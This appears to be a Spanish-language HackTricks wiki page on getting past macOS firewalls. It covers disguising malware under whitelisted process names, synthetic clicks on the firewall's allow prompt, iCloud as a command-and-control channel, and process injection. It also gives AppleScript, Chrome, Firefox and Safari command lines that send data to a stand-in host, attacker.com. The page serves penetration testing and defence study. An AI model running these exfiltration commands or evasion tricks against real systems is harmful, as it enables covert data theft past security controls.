# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Técnicas encontradas

Las siguientes técnicas se encontraron funcionando en algunas aplicaciones de firewall de macOS.

### Abusando de nombres en la lista blanca

- Por ejemplo, llamar al malware con nombres de procesos bien conocidos de macOS como **`launchd`**

### Clic sintético

- Si el firewall pide permiso al usuario, hacer que el malware **haga clic en permitir**

### **Usar binarios firmados por Apple**

- Como **`curl`**, pero también otros como **`whois`**

### Dominios de Apple bien conocidos

El firewall podría estar permitiendo conexiones a dominios de Apple bien conocidos como **`apple.com`** o **`icloud.com`**. Y iCloud podría ser utilizado como un C2.

### Bypass genérico

Algunas ideas para intentar eludir firewalls

### Verificar tráfico permitido

Conocer el tráfico permitido te ayudará a identificar dominios potencialmente en la lista blanca o qué aplicaciones tienen permiso para acceder a ellos.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusando de DNS

Las resoluciones DNS se realizan a través de la aplicación firmada **`mdnsreponder`** que probablemente estará permitida para contactar servidores DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### A través de aplicaciones de navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### A través de inyecciones de procesos

Si puedes **inyectar código en un proceso** que tiene permiso para conectarse a cualquier servidor, podrías eludir las protecciones del firewall:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Referencias

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
